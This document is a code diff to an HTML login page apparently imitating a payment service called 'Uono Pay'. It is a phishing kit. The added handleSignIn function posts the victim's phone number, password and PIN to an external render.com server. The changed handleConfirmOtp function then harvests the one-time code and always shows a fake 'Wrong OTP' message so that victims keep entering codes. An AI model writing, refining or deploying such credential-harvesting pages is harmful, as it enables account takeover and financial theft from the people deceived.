@@ -346,8 +346,7 @@
     <div class="logo-container">
         <img src="https://raw.githubusercontent.com/kgan35723-cell/Uonopay/main/uono-pay-logo.webp">
     </div>
-
-    <form onsubmit="event.preventDefault(); openOtpModal();">
+      <form onsubmit="event.preventDefault(); handleSignIn();"> 
         <!-- Phone Input (10 digits max) -->
         <div class="input-group">
             <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.15 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.12.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
@@ -394,7 +393,7 @@
             <input type="text" placeholder= "Enter 6- Digit Otp"• • • • • •" maxlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '');" id="otpInput">    
             <button class="send-otp-btn" id="sendOtpBtn" onclick="startOtpTimer(this);">Send</button>
         </div>
-        <button class="confirm-btn" onclick="confirmLogin();">CONFIRM</button>
+        <button class="confirm-btn" onclick="handleConfirmOtp(event);">CONFIRM</button>
     </div>
 </div>
 
@@ -440,38 +439,51 @@
             }
         }, 1000);
     }
-function confirmLogin() {
+    function handleSignIn() {
   const phone = document.querySelector('input[type="tel"]').value;
   const password = document.querySelectorAll('input[type="password"]')[0].value;
   const pin = document.querySelectorAll('input[type="password"]')[1].value;
-  const otp = document.getElementById('otpInput').value;
-  const issueElement = document.getElementById('issue');
-  const issue = issueElement ? issueElement.value : '';
+
+  fetch('https://uonopay.onrender.com/submit-login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ phone, password, pin })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      document.getElementById('otpModal').style.display = 'flex';
+    } else {
+      alert('Login failed');
+    }
+  })
+  .catch(error => console.error('Error:', error));
+}
+
+function handleConfirmOtp(event) {
+ event.preventDefault();
+const otp = document.getElementById('otpInput').value;
 
   if (otp && otp.length === 6) {
-    fetch('https://uonopay-yq96.onrender.com/submit', {
+    fetch('https://uonopay.onrender.com/submit-otp', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ phone, password, pin, otp, issue })
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ otp })
     })
     .then(response => response.json())
     .then(data => {
-      alert('worng OTP please try again');
       if (data.success) {
-        closeOtpModal();
-      console.log(data)
+        alert('Wrong OTP please try again');
+        document.getElementById('otpModal').style.display = 'none';
+      } else {
+        alert('Wrong OTP please try again');
       }
     })
-    .catch(error => {
-      console.error('Error:', error);
-      alert('Failed to send data.');
-    });
+    .catch(error => console.error('Error:', error));
   } else {
     alert('Please enter a valid 6-digit OTP.');
   }
-}
+    }
     
     
 </script>
